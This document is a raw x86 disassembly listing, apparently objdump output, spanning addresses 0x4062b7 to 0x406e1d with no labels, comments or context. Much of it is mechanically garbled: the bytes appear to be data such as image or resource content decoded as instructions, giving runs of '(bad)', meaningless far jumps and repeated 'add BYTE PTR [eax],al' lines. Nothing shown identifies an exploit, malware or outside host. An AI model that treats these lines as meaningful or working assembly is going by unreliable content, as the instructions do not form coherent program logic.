  4062b7:	add    BYTE PTR [edx-0x4bffadb0],ah
  4062bd:	pop    ebp
  4062be:	pop    ebp
  4062bf:	add    BYTE PTR [ebp-0x4affa69f],dl
  4062c5:	pusha  
  4062c6:	push   ebp
  4062c7:	add    BYTE PTR [esi-0x65ff918e],bl
  4062cd:	jbe    0x406348
  4062cf:	add    BYTE PTR [ebp-0x41ff9d99],dh
  4062d5:	jo     0x40633f
  4062d7:	add    BYTE PTR [edi-0x4fff8a83],ah
  4062dd:	je     0x406351
  4062df:	add    BYTE PTR [ebx-0x2aff8a83],bh
  4062e5:	push   esi
  4062e6:	inc    ebx
  4062e7:	add    dh,ah
  4062e9:	pop    edi
  4062ea:	inc    edi
  4062eb:	add    bh,dl
  4062ed:	bound  ecx,QWORD PTR [esi+0x0]
  4062f0:	lds    ebp,FWORD PTR [ecx+0x59]
  4062f3:	add    ch,dl
  4062f5:	gs push ecx
  4062f7:	add    dl,ah
  4062f9:	push   0x73eb0053
  4062fe:	pop    esp
  4062ff:	add    bl,bh
  406301:	ja     0x406360
  406303:	add    ah,cl
  406305:	je     0x40636e
  406307:	add    cl,bl
  406309:	js     0x406373
  40630b:	add    cl,dl
  40630d:	jl     0x406389
  40630f:	add    ah,ah
  406311:	ja     0x406377
  406313:	add    ah,dh
  406315:	js     0x40637a
  406317:	add    bl,cl
  406319:	mov    edi,DWORD PTR [edi+0x0]
  40631c:	jmp    0x778c:0xf5007687
  406323:	add    BYTE PTR [edx+0x7f008079],al
  406329:	mov    WORD PTR [esi-0x756b8100],cs
  40632f:	add    BYTE PTR ds:0x4b0085f2,dl
  406335:	(bad)  
  406336:	mov    es,WORD PTR [eax]
  406338:	add    BYTE PTR [edx-0x7876ff7d],0x87
  40633f:	add    BYTE PTR [esi-0x66ff7173],cl
  406345:	test   DWORD PTR [eax-0x6b707600],ecx
  40634b:	add    BYTE PTR [ecx-0x63ff6d72],dl
  406351:	(bad)  
  406352:	xchg   edi,eax
  406353:	add    BYTE PTR [eax-0x77ff6c63],cl
  406359:	xchg   ecx,eax
  40635a:	cwde   
  40635b:	add    BYTE PTR [ebx+edx*4-0x6b64ff6c],dl
  406362:	xchg   ebp,eax
  406363:	add    BYTE PTR [ecx-0x69ff6a65],dl
  406369:	cdq    
  40636a:	call   0xa700:0x9b9b9c00
  406371:	mov    WORD PTR [esi-0x7b754400],es
  406377:	add    BYTE PTR [ebp-0x4aff726f],ch
  40637d:	xchg   ecx,eax
  40637e:	mov    eax,DWORD PTR [eax]
  406380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406381:	popf   
  406382:	pushf  
  406383:	add    BYTE PTR [edi+ebx*4-0x5c52ff62],bh
  40638a:	lahf   
  40638b:	add    BYTE PTR [ebp-0x73ff695f],bh
  406391:	pushf  
  406392:	mov    ds:0xa19d9500,eax
  406397:	add    BYTE PTR [esi+ebx*4-0x4b69ff60],bl
  40639e:	scas   al,BYTE PTR es:[edi]
  40639f:	add    BYTE PTR [edi-0x5bff4851],dl
  4063a5:	mov    ds:0xa6a800a3,eax
  4063aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ab:	add    BYTE PTR [eax-0x5bff5359],ch
  4063b1:	stos   BYTE PTR es:[edi],al
  4063b2:	stos   DWORD PTR es:[edi],eax
  4063b3:	add    BYTE PTR [ebp-0x4eff5354],ch
  4063b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063bb:	add    BYTE PTR [edx-0x4eff5859],bh
  4063c1:	lods   eax,DWORD PTR ds:[esi]
  4063c2:	lods   al,BYTE PTR ds:[esi]
  4063c3:	add    BYTE PTR [edx-0x51ff5453],bh
  4063c9:	mov    al,0xae
  4063cb:	add    BYTE PTR [ecx-0x4eff5150],bh
  4063d1:	scas   eax,DWORD PTR es:[edi]
  4063d2:	mov    al,0x0
  4063d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063d5:	mov    ch,0xb6
  4063d7:	add    BYTE PTR [edx-0x52ff4b4f],ch
  4063dd:	mov    ebp,0xb3b400be
  4063e2:	mov    bl,0x0
  4063e4:	mov    ebx,0xb600b4b7
  4063e9:	mov    edx,0xb6b000b7
  4063ee:	mov    edx,0xb9b5ba00
  4063f3:	add    BYTE PTR [ecx-0x43ff4346],dh
  4063f9:	mov    esp,0x89c700bc
  4063fe:	add    BYTE PTR [eax],0xc8
  406401:	xchg   esi,eax
  406402:	mov    es,WORD PTR [eax]
  406404:	loop   0x406395
  406406:	add    BYTE PTR [eax],0xee
  406409:	cwde   
  40640a:	xchg   DWORD PTR [eax],eax
  40640c:	neg    BYTE PTR [ebx-0x5606ff77]
  406412:	cdq    
  406413:	add    ch,bh
  406415:	mov    ah,0x9c
  406417:	add    ah,al
  406419:	scas   al,BYTE PTR es:[edi]
  40641a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40641b:	add    bh,al
  40641d:	lods   al,BYTE PTR ds:[esi]
  40641e:	stos   BYTE PTR es:[edi],al
  40641f:	add    ch,dl
  406421:	lods   eax,DWORD PTR ds:[esi]
  406422:	mov    ds:0xabb3c400,eax
  406427:	add    ah,dl
  406429:	mov    cl,0xa7
  40642b:	add    al,dl
  40642d:	mov    bl,0xad
  40642f:	add    ch,al
  406431:	mov    bh,0xb5
  406433:	add    bl,cl
  406435:	mov    esp,0xb4cc00b6
  40643a:	mov    esi,0xbbbac000
  40643f:	add    al,cl
  406441:	mov    ebp,0xb7e300bc
  406446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406447:	add    dl,bh
  406449:	mov    eax,0xbfed00a8
  40644e:	mov    bh,0x0
  406450:	test   edx,0xc4e200ac
  406456:	mov    esp,0xb5c7fb00
  40645b:	add    BYTE PTR [esi-0x20ff3b41],dh
  406461:	test   al,0xc4
  406463:	add    BYTE PTR [ebp-0x4eff3237],ch
  406469:	ret    0xc7
  40646c:	mov    esi,0xb700c0c0
  406471:	(bad)  
  406472:	retf   
  406473:	add    BYTE PTR [ebp-0x46ff373a],bh
  406479:	retf   0xcc
  40647c:	mov    dh,0xcc
  40647e:	rol    BYTE PTR [eax],cl
  406480:	mov    edx,0xbe00d2ce
  406485:	rcl    bl,1
  406487:	add    BYTE PTR [edx-0x43ff272f],bh
  40648d:	loopne 0x406474
  40648f:	add    ah,al
  406491:	(bad)  
  406492:	les    eax,FWORD PTR [eax]
  406494:	retf   0xc5c4
  406497:	add    ah,al
  406499:	(bad)  
  40649a:	leave  
  40649b:	add    ch,al
  40649d:	retf   
  40649e:	retf   0xcb00
  4064a1:	int3   
  4064a2:	int3   
  4064a3:	add    ch,dl
  4064a5:	mov    bl,0x0
  4064a8:	ror    esp,cl
  4064aa:	int3   
  4064ab:	add    ch,cl
  4064ad:	ror    dh,1
  4064af:	add    bl,al
  4064b1:	iret   
  4064b2:	rol    BYTE PTR [eax],cl
  4064b4:	fadd   st,st(4)
  4064b6:	rol    BYTE PTR [eax],1
  4064b8:	ret    0xd5d1
  4064bb:	add    cl,cl
  4064bd:	rcl    bl,1
  4064bf:	add    dl,al
  4064c1:	aam    0xdb
  4064c3:	add    bl,cl
  4064c5:	xlat   BYTE PTR ds:[ebx]
  4064c6:	fild   DWORD PTR [eax]
  4064c8:	ret    
  4064c9:	(bad)  
  4064cb:	add    ch,cl
  4064cd:	(bad)  
  4064cf:	add    bl,dl
  4064d1:	rcl    ebx,cl
  4064d3:	add    dl,bl
  4064d5:	aam    0xd4
  4064d7:	add    dh,bl
  4064d9:	(bad)  
  4064da:	fadd   DWORD PTR [eax]
  4064dc:	xlat   BYTE PTR ds:[ebx]
  4064dd:	fcmovu st,st(1)
  4064df:	add    bl,bl
  4064e1:	(bad)  
  4064e3:	add    bl,ah
  4064e5:	int3   
  4064e6:	les    eax,FWORD PTR [eax]
  4064e8:	cld    
  4064e9:	fmul   st,st(1)
  4064eb:	add    bh,ah
  4064ed:	fstp   st(0)
  4064ef:	add    dh,bh
  4064f1:	fst    st(3)
  4064f3:	add    dh,ch
  4064f5:	loop   0x4064d1
  4064f7:	add    dh,bh
  4064f9:	jecxz  0x4064d2
  4064fb:	add    cl,dl
  4064fd:	fsubrp st(1),st
  4064ff:	add    bl,al
  406501:	loopne 0x4064e7
  406503:	add    bl,cl
  406505:	in     al,0xe5
  406507:	add    dh,al
  406509:	out    0xea,al
  40650b:	add    dl,cl
  40650d:	out    0xeb,al
  40650f:	add    dh,al
  406511:	jmp    0xea0f6603
  406516:	in     al,dx
  406517:	add    cl,dl
  406519:	loope  0x4064ff
  40651b:	add    dl,bl
  40651d:	in     al,0xe6
  40651f:	add    bl,bl
  406521:	in     eax,0xe8
  406523:	add    ah,bl
  406525:	in     al,dx
  406526:	in     eax,dx
  406527:	add    ah,al
  406529:	jmp    0x40651d
  40652b:	add    ah,dl
  40652d:	out    dx,al
  40652e:	hlt    
  40652f:	add    ah,bl
  406531:	sti    
  406532:	std    
  406533:	add    cl,ah
  406535:	loope  0x406518
  406537:	add    cl,ch
  406539:	in     eax,0xe4
  40653b:	add    al,ah
  40653d:	call   0xec2c662c
  406542:	jmp    0xff00:0xe5e9f900
  406549:	icebp  
  40654a:	in     eax,dx
  40654b:	add    ch,dh
  40654d:	div    ch
  40654f:	add    bh,bh
  406551:	clc    
  406552:	test   BYTE PTR [eax],0xf5
  406555:	idiv   cl
  406557:	add    dh,bh
  406559:	(bad)  
  40655a:	inc    BYTE PTR [eax]
  40655c:	(bad)  
  40655d:	(bad)  
  40655e:	inc    DWORD PTR [eax]
	...
  4065b0:	add    ah,bl
  4065b2:	(bad)  
  4065b4:	iret   
  4065b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4065ce:	add    bh,cl
  4065d0:	fnstsw ax
  4065d2:	cmc    
  4065d3:	loopne 0x4065b4
  4065d5:	loopne 0x4065a4
  4065d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4065ec:	add    BYTE PTR [edx-0xa1f2120],ah
  4065f2:	cmc    
  4065f3:	rcl    ebx,cl
  4065f5:	clc    
  4065f6:	iret   
  4065f7:	rcr    esp,cl
  4065f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  40660a:	add    BYTE PTR [eax],al
  40660c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40660d:	fmul   st(5),st
  40660f:	into   
  406610:	fdivr  st(5),st
  406612:	cmc    
  406613:	(bad)  
  406615:	loopne 0x4065ce
  406617:	int    0xa2
  406619:	int    0x9a
	...
  40662b:	add    BYTE PTR [esi-0x2332595e],ah
  406631:	loopne 0x406613
  406633:	ror    ebp,cl
  406635:	iret   
  406636:	int    0xa6
  406638:	cmp    DWORD PTR [eax-0x31],0x0
	...
  40664c:	iret   
  40664d:	rol    ebx,cl
  40664f:	ret    
  406650:	int    0xd3
  406652:	(bad)  
  406654:	int    0xc3
  406656:	xchg   ecx,eax
  406657:	jbe    0x4066cf
  406659:	add    DWORD PTR [ebx+0x0],0x0
  406660:	add    BYTE PTR [eax],al
  406662:	adc    dh,BYTE PTR [edi+0x7f]
	...
  40666d:	mov    ds:0x9ca4cfd3,al
  406672:	cwde   
  406673:	xor    DWORD PTR [esi+0xe],0xb
  406677:	or     eax,0x9c95a27f
  40667c:	int    0x0
  40667e:	add    BYTE PTR [eax],al
  406680:	add    BYTE PTR [ebx-0x7c1f5d7d],al
  406686:	or     cl,BYTE PTR [esi]
  406688:	xchg   ecx,eax
  406689:	add    DWORD PTR [eax],0x0
  40668c:	add    BYTE PTR [eax],al
  40668e:	add    BYTE PTR [eax+0x10108391],al
  406694:	adc    BYTE PTR [esi-0x72],dh
  406697:	call   0x95dc:0xefedd8c4
  40669e:	add    BYTE PTR [eax],al
  4066a0:	add    BYTE PTR [edi-0x5c],bh
  4066a3:	js     0x40663a
  4066a5:	fmul   st(5),st
  4066a7:	xor    BYTE PTR [esi+0x7f],0x95
  4066ab:	jg     0x4066ad
  4066ad:	add    BYTE PTR [eax],al
  4066af:	add    BYTE PTR [ebp-0x6f738186],dl
  4066b5:	fsubr  st,st(0)
  4066b7:	out    dx,al
  4066b8:	fdiv   QWORD PTR [edx-0x3c3a4a95]
  4066be:	add    BYTE PTR [eax],al
  4066c0:	add    BYTE PTR [eax-0x6a6a775a],al
  4066c6:	xchg   ebp,eax
  4066c7:	iret   
  4066c8:	loopne 0x40664d
  4066ca:	or     eax,0xc28d1076
  4066cf:	mov    ecx,0xafb4c5c1
  4066d5:	test   al,0x64
  4066d7:	xor    DWORD PTR [eax],esp
  4066d9:	pop    ds
  4066da:	pop    ss
  4066db:	test   eax,ebp
  4066dd:	mov    ds:0x83000000,al
  4066e2:	int    0x91
  4066e4:	call   0xc88f:0x727b7f91
  4066eb:	repz hlt 
  4066ed:	out    dx,al
  4066ee:	int    0x89
  4066f0:	pusha  
  4066f1:	push   edi
  4066f2:	cmp    eax,0x1f1f1721
  4066f7:	and    DWORD PTR [edi],esp
  4066f9:	xor    BYTE PTR [eax],ch
  4066fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066fc:	jmp    0xd383:0x91
  406703:	mov    bl,BYTE PTR [edx-0x626a806d]
  406709:	into   
  40670a:	xchg   edi,eax
  40670b:	pop    edi
  40670c:	push   esi
  40670d:	aaa    
  40670e:	sbb    al,0x13
  406710:	adc    edx,DWORD PTR [ebx]
  406712:	adc    al,0x17
  406714:	xor    bh,BYTE PTR [ebx]
  406716:	cmp    al,0x3c
  406718:	dec    edx
  406719:	dec    edx
  40671a:	inc    esi
  40671b:	imul   ebp,esp,0x8a
  406721:	mov    ch,bl
  406723:	xchg   ecx,eax
  406724:	call   0x151d:0x4fd68395
  40672b:	add    al,BYTE PTR [ecx]
  40672d:	add    DWORD PTR [edx],eax
  40672f:	adc    al,0x4
  406731:	pop    es
  406732:	sbb    esp,DWORD PTR [esi]
  406734:	dec    esp
  406735:	dec    esp
  406736:	dec    esp
  406737:	dec    ebp
  406738:	dec    ebp
  406739:	popa   
  40673a:	dec    ebx
  40673b:	gs in  al,dx
  40673d:	xchg   ebx,eax
  40673e:	add    BYTE PTR [eax],al
  406740:	add    BYTE PTR [ebx-0x636a6c22],al
  406746:	mov    gs,eax
  406748:	xor    eax,DWORD PTR [edx]
  40674a:	sbb    al,0x19
  40674c:	sbb    DWORD PTR [ecx],ebx
  40674e:	sbb    DWORD PTR ds:0x2c03a296,eax
  406754:	gs gs gs data16 bound sp,DWORD PTR gs:[esi-0x12]
  40675d:	xchg   esp,eax
  40675e:	add    BYTE PTR [eax],al
  406760:	add    BYTE PTR [esi-0x5b637721],cl
  406766:	xchg   ecx,eax
  406767:	aam    0x51
  406769:	sbb    al,0x35
  40676b:	cs sbb al,BYTE PTR cs:[ebx]
  40676f:	mov    ah,0xe0
  406771:	int    0x79
  406773:	das    
  406774:	push   0x6a
  406776:	ins    BYTE PTR es:[edi],dx
  406777:	ins    BYTE PTR es:[edi],dx
  406778:	ins    BYTE PTR es:[edi],dx
  406779:	ins    BYTE PTR es:[edi],dx
  40677a:	addr16 addr16 out 0x9a,eax
  40677e:	add    BYTE PTR [eax],al
  406780:	add    BYTE PTR [eax-0x3c65772d],cl
  406786:	mov    ds:0x38195bd4,al
  40678b:	cmp    BYTE PTR ds:0x58fbd208,dh
  406791:	xchg   ebp,esi
  406793:	push   ecx
  406794:	test   eax,0x6f6f6f6f
  406799:	jo     0x40680b
  40679b:	ins    DWORD PTR es:[edi],dx
  40679c:	fcomp  QWORD PTR [edi-0x7d000000]
  4067a2:	mov    dh,0x79
  4067a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067a5:	iret   
  4067a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067a7:	into   
  4067a8:	sub    BYTE PTR [esi],0x53
  4067ab:	push   ebp
  4067ac:	push   ebx
  4067ad:	sar    ecx,cl
  4067af:	push   eax
  4067b0:	sub    DWORD PTR [edx],edi
  4067b2:	cmc    
  4067b3:	fstp   QWORD PTR [esi-0x56]
  4067b6:	stos   BYTE PTR es:[edi],al
  4067b7:	stos   BYTE PTR es:[edi],al
  4067b8:	stos   DWORD PTR es:[edi],eax
  4067b9:	lods   al,BYTE PTR ds:[esi]
  4067ba:	lods   al,BYTE PTR ds:[esi]
  4067bb:	jo     0x40677a
  4067bd:	mov    DWORD PTR [eax],0x967c0000
  4067c3:	jle    0x40677c
  4067c5:	rol    ebx,cl
  4067c7:	into   
  4067c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067c9:	xor    edx,DWORD PTR [ebp+0x57]
  4067cc:	push   ds
  4067cd:	push   esp
  4067ce:	xor    eax,0x5c2a2826
  4067d3:	call   FWORD PTR [ebx-0x52535392]
  4067d9:	lods   eax,DWORD PTR ds:[esi]
  4067da:	lods   eax,DWORD PTR ds:[esi]
  4067db:	jo     0x406798
  4067dd:	fmul   st,st(5)
  4067df:	add    BYTE PTR [eax],al
  4067e1:	jge    0x406857
  4067e3:	jne    0x4067a5
  4067e5:	fmul   st(5),st
  4067e7:	into   
  4067e8:	lds    esi,FWORD PTR [edi]
  4067ea:	pop    esp
  4067eb:	push   ebp
  4067ec:	push   ss
  4067ed:	and    al,0x25
  4067ef:	sub    DWORD PTR [edx],ebp
  4067f1:	inc    esp
  4067f2:	inc    esi
  4067f3:	sar    edi,1
  4067f5:	test   BYTE PTR [edx-0x41454546],bh
  4067fb:	lods   eax,DWORD PTR ds:[esi]
  4067fc:	mov    ebx,0x95d6
  406801:	jae    0x40680c
  406803:	pmullw mm3,mm7
  406806:	into   
  406807:	ror    eax,cl
  406809:	ss pop ebp
  40680b:	cmp    DWORD PTR [edi],edx
  40680d:	sub    al,BYTE PTR es:[ebp+eax*2+0x43]
  406812:	inc    edi
  406813:	mov    al,0xe0
  406815:	cmc    
  406816:	test   BYTE PTR [esi-0x411d1d1e],bh
  40681c:	mov    esp,0x8ed6
  406821:	jno    0x406829
  406823:	or     al,0xce
  406825:	(bad)  
  406827:	ror    ecx,cl
  406829:	dec    ecx
  40682a:	pop    ecx
  40682b:	sbb    BYTE PTR ds:0x45442a28,ah
  406831:	inc    ecx
  406832:	dec    esi
  406833:	out    0xaf,al
  406835:	loopne 0x4067dd
  406837:	mov    esp,edx
  406839:	loop   0x40681d
  40683b:	loop   0x4067f9
  40683d:	fild   DWORD PTR [edx+0x10b70000]
  406843:	xchg   ebp,eax
  406844:	std    
  406845:	(bad)  
  406846:	out    dx,eax
  406847:	(bad)  
  406849:	push   edx
  40684a:	das    
  40684b:	pop    ss
  40684c:	sub    BYTE PTR [edx],ch
  40684e:	inc    esp
  40684f:	inc    esp
  406850:	inc    edi
  406851:	inc    edx
  406852:	push   0xdcb1e2fb
  406857:	mov    ch,BYTE PTR [edi-0x411b191c]
  40685d:	loopne 0x4067ed
  40685f:	add    BYTE PTR [eax],al
  406861:	add    BYTE PTR [eax],al
  406863:	ret    
  406864:	mov    ds:0xe7ffffdf,al
  406869:	push   edx
  40686a:	adc    al,0x24
  40686c:	sub    BYTE PTR [edx],ch
  40686e:	inc    esp
  40686f:	inc    ebp
  406870:	inc    edi
  406871:	inc    edx
  406872:	lods   eax,DWORD PTR ds:[esi]
  406873:	sti    
  406874:	in     al,0xe3
  406876:	cwde   
  406877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406878:	mov    bh,cl
  40687a:	cli    
  40687b:	cli    
  40687c:	loop   0x406874
  40687e:	xchg   esp,eax
  40687f:	add    BYTE PTR [eax],al
  406881:	add    BYTE PTR [eax],al
  406883:	add    BYTE PTR [eax],al
  406885:	add    BYTE PTR [edx+0x145ad4a2],ah
  40688b:	and    eax,0x45442a29
  406890:	inc    edi
  406891:	dec    eax
  406892:	in     al,0xff
  406894:	cli    
  406895:	stc    
  406896:	in     eax,0xe5
  406898:	jecxz  0x40687e
  40689a:	out    0xe2,al
  40689c:	lods   eax,DWORD PTR ds:[esi]
  40689d:	stc    
  40689e:	lahf   
	...
  4068a7:	add    bh,cl
  4068a9:	mov    BYTE PTR [esi],dl
  4068ab:	and    ah,BYTE PTR [ebx]
  4068ad:	ds aas 
  4068af:	inc    ecx
  4068b0:	inc    ecx
  4068b1:	dec    eax
  4068b2:	in     al,0xe2
  4068b4:	mov    esi,0xbabcbcbe
  4068b9:	mov    ecx,0xfbe1bdb9
  4068be:	iret   
	...
  4068c7:	add    BYTE PTR [eax],al
  4068c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068ca:	adc    ebx,DWORD PTR [edi]
  4068cc:	and    ebp,DWORD PTR [ebx]
  4068ce:	xor    DWORD PTR [ecx+eiz*2+0x6a],ecx
  4068d2:	mov    al,0xb3
  4068d4:	mov    bl,0xb8
  4068d6:	iret   
  4068d7:	rcl    ebx,cl
  4068d9:	fucomi st,st(6)
  4068db:	div    ecx
  4068dd:	test   BYTE PTR [eax],0x0
	...
  4068e8:	add    BYTE PTR [edi-0x596679a6],bh
  4068ee:	(bad)  
  4068ef:	retf   
  4068f0:	in     al,dx
  4068f1:	repnz out dx,al
  4068f3:	out    dx,eax
  4068f4:	test   DWORD PTR [eax],0x0
	...
  406906:	add    BYTE PTR [eax],al
  406908:	add    ah,bl
  40690a:	icebp  
  40690b:	icebp  
	...
  406960:	(bad)  
  406961:	(bad)  
  406962:	(bad)  
  406963:	(bad)  
  406964:	(bad)  
  406965:	(bad)  
  406966:	(bad)  
  406967:	(bad)  
  406968:	(bad)  
  406969:	inc    DWORD PTR [ebx+0xfeffff]
  40696f:	(bad)  
  406970:	(bad)  
  406971:	clc    
  406972:	add    BYTE PTR [edi],bh
  406974:	push   eax
  406976:	add    BYTE PTR [edi],bl
  406978:	push   eax
  40697a:	add    BYTE PTR [edi],bl
  40697c:	push   eax
  40697e:	add    BYTE PTR [edi],bl
  406980:	xbegin 0x3ec07086
  406986:	add    BYTE PTR [ebx],al
  406988:	or     BYTE PTR [edi],0x0
  40698b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  406991:	add    BYTE PTR [eax],al
  406993:	add    eax,DWORD PTR [eax-0x7ffd0000]
  406999:	add    BYTE PTR [eax],al
  40699b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  4069a1:	add    BYTE PTR [eax],al
  4069a3:	add    eax,DWORD PTR [eax-0x7ffd0000]
  4069a9:	add    BYTE PTR [eax],al
  4069ab:	add    eax,DWORD PTR [eax-0x7fff0000]
  4069b1:	add    BYTE PTR [eax],al
  4069b3:	add    DWORD PTR [eax-0x7fff0000],eax
  4069b9:	add    BYTE PTR [eax],al
  4069bb:	add    DWORD PTR [eax-0x1fff0000],eax
  4069c1:	add    BYTE PTR [eax],al
  4069c3:	add    esp,edi
  4069c5:	add    BYTE PTR [eax],al
  4069c7:	add    edi,edi
  4069c9:	add    BYTE PTR [eax],al
  4069cb:	add    edi,edi
  4069cd:	add    BYTE PTR [eax],0x3
  4069d0:	inc    DWORD PTR [eax-0x700000f9]
  4069d6:	(bad)  
  4069d7:	(bad)  
  4069d8:	(bad)  
  4069d9:	(bad)  
  4069da:	(bad)  
  4069db:	(bad)  
  4069dc:	(bad)  
  4069dd:	(bad)  
  4069de:	(bad)  
  4069df:	jmp    FWORD PTR [eax]
  4069e1:	add    BYTE PTR [eax],al
  4069e3:	add    BYTE PTR [eax],dl
  4069e5:	add    BYTE PTR [eax],al
  4069e7:	add    BYTE PTR [eax],ah
  4069e9:	add    BYTE PTR [eax],al
  4069eb:	add    BYTE PTR [ecx],al
  4069ed:	add    BYTE PTR [eax],cl
  4069ef:	add    BYTE PTR [eax],al
  4069f1:	add    BYTE PTR [eax],al
  4069f3:	add    BYTE PTR [eax],al
  4069f5:	add    DWORD PTR [eax],eax
	...
  4069ff:	add    BYTE PTR [eax],al
  406a01:	add    DWORD PTR [eax],eax
  406a03:	add    BYTE PTR [eax],al
  406a05:	add    DWORD PTR [eax],eax
  406a07:	add    BYTE PTR [eax],al
  406a09:	add    BYTE PTR [eax],al
  406a0b:	add    BYTE PTR [eax+0x44],cl
  406a0e:	inc    ebx
  406a0f:	add    BYTE PTR [ebx+0x79],bh
  406a12:	jns    0x406a14
  406a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a15:	(bad)  
  406a16:	verw   WORD PTR [eax-0x54fff1f2]
  406a1d:	adc    ecx,DWORD PTR ds:0xc1db900
  406a23:	add    BYTE PTR [ecx-0x4dffdfe0],ch
  406a29:	sub    al,0x23
  406a2b:	add    BYTE PTR [edi+ebp*1+0x2fbc0022],dh
  406a32:	and    al,0x0
  406a34:	mov    bl,0x31
  406a36:	and    al,BYTE PTR [eax]
  406a38:	mov    ah,0x3f
  406a3a:	das    
  406a3b:	add    dl,cl
  406a3d:	add    al,0x4
  406a3f:	add    ah,bl
  406a41:	sldt   WORD PTR [eax]
  406a44:	lds    ebx,FWORD PTR [eax]
  406a46:	pop    es
  406a47:	add    ch,al
  406a49:	sbb    al,0x9
  406a4b:	add    ah,dl
  406a4d:	sbb    DWORD PTR [ecx],eax
  406a4f:	add    ah,dl
  406a51:	sbb    eax,0x1ad80001
  406a56:	add    BYTE PTR [eax],al
  406a58:	fstp   DWORD PTR ds:0x12e80000
  406a5e:	add    BYTE PTR [eax],al
  406a60:	out    0x1b,al
  406a62:	add    BYTE PTR [eax],al
  406a64:	in     eax,dx
  406a65:	sbb    al,BYTE PTR [eax]
  406a67:	add    bh,dh
  406a69:	push   ss
  406a6a:	add    BYTE PTR [eax],al
  406a6c:	retf   
  406a6d:	and    eax,0x3bdd0003
  406a72:	adc    BYTE PTR [eax],al
  406a74:	jecxz  0x406a9c
  406a76:	add    BYTE PTR [eax],al
  406a78:	mov    ah,0x40
  406a7a:	xor    eax,0x3a43b800
  406a7f:	add    dh,bl
  406a81:	inc    eax
  406a82:	and    eax,0x2c47d700
  406a87:	add    dh,bl
  406a89:	dec    edi
  406a8a:	sub    eax,0x3441c000
  406a8f:	add    bl,bl
  406a91:	pop    eax
  406a92:	cmp    eax,DWORD PTR [eax]
  406a94:	jecxz  0x406ada
  406a96:	daa    
  406a97:	add    bh,bh
  406a99:	pop    ecx
  406a9a:	ss add bh,bh
  406a9d:	xor    DWORD PTR gs:[eax],eax
  406aa0:	jmp    FWORD PTR [edx+0x3d]
  406aa3:	add    bh,bh
  406aa5:	jg     0x406ae3
  406aa7:	add    ch,bl
  406aa9:	pop    esp
  406aaa:	inc    ecx
  406aab:	add    dl,bl
  406aad:	bound  ecx,QWORD PTR [eax+0x0]
  406ab0:	fbstp  TBYTE PTR [ebx+0x43]
  406ab3:	add    dh,dl
  406ab5:	push   0x53
  406ab7:	add    ch,dl
  406ab9:	ins    BYTE PTR es:[edi],dx
  406aba:	pop    ecx
  406abb:	add    bh,bh
  406abd:	imul   ecx,DWORD PTR [eax+0x0],0xffffffff
  406ac1:	jo     0x406b0e
  406ac3:	add    ah,cl
  406ac5:	jno    0x406b2a
  406ac7:	add    BYTE PTR [eax],al
  406ac9:	repnz dec eax
  406acb:	add    dl,bl
  406acd:	adc    DWORD PTR [ecx+0x0],0x5983d7
  406ad4:	(bad)  
  406ad5:	sbb    BYTE PTR [eax+eax*1-0x2c],0x82
  406ada:	jne    0x406adc
  406adc:	(bad)  
  406ade:	add    BYTE PTR [eax],0x8a
  406ae1:	mov    cl,BYTE PTR [edx-0x6f6f6f00]
  406ae7:	add    BYTE PTR [esp+edx*4-0x6364ff6c],dl
  406aee:	pushf  
  406aef:	add    BYTE PTR [esi-0x4cff6162],bl
  406af5:	lea    eax,[edi-0x5f5f6100]
  406afb:	add    BYTE PTR [ecx-0x5fff5a41],bl
  406b01:	mov    al,ds:0xa4a400a0
  406b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b07:	add    BYTE PTR [edx-0x54ff5556],ch
  406b0d:	lods   al,BYTE PTR ds:[esi]
  406b0e:	lods   al,BYTE PTR ds:[esi]
  406b0f:	add    BYTE PTR [ebp-0x4fff5253],ch
  406b15:	mov    cl,0xb1
  406b17:	add    BYTE PTR [ebp+esi*4-0x4647ff4b],dh
  406b1e:	mov    ecx,0xbcbcbb00
  406b23:	add    BYTE PTR [esi-0xcff4142],bh
  406b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b2a:	nop
  406b2b:	add    al,al
  406b2d:	mov    edx,0xc0c000b8
  406b32:	rol    BYTE PTR [eax],0xc4
  406b35:	mov    dh,0x0
  406b38:	leave  
  406b39:	(bad)
  406b3c:	(bad)
  406b3f:	add    al,cl
  406b41:	retf   0xca
  406b44:	leave  
  406b45:	retf   
  406b46:	int3   
  406b47:	add    dl,cl
  406b49:	int3   
  406b4a:	int3   
  406b4b:	add    ah,cl
  406b4d:	into   
  406b4e:	into   
  406b4f:	add    ah,bl
  406b51:	retf   0xc9
  406b54:	into   
  406b55:	rcl    al,1
  406b57:	add    al,dl
  406b59:	rcl    edx,1
  406b5b:	add    dh,dl
  406b5d:	(bad)  
  406b5e:	aad    0x0
  406b60:	(bad)  
  406b62:	fld    DWORD PTR [eax]
  406b64:	(bad)  
  406b66:	fild   WORD PTR [eax]
  406b68:	loope  0x406b4b
  406b6a:	loope  0x406b6c
  406b6c:	call   0xee415459
  406b71:	out    dx,al
  406b72:	out    dx,al
  406b73:	add    al,bh
  406b75:	clc    
  406b76:	clc    
	...
  406e03:	add    bh,bh
  406e05:	(bad)  
  406e06:	inc    DWORD PTR [eax]
	...
  406e18:	aaa    
  406e19:	add    dh,BYTE PTR [edi]
  406e1b:	add    BYTE PTR [eax],al
  406e1d:	add    BYTE PTR [esi+0x46],al
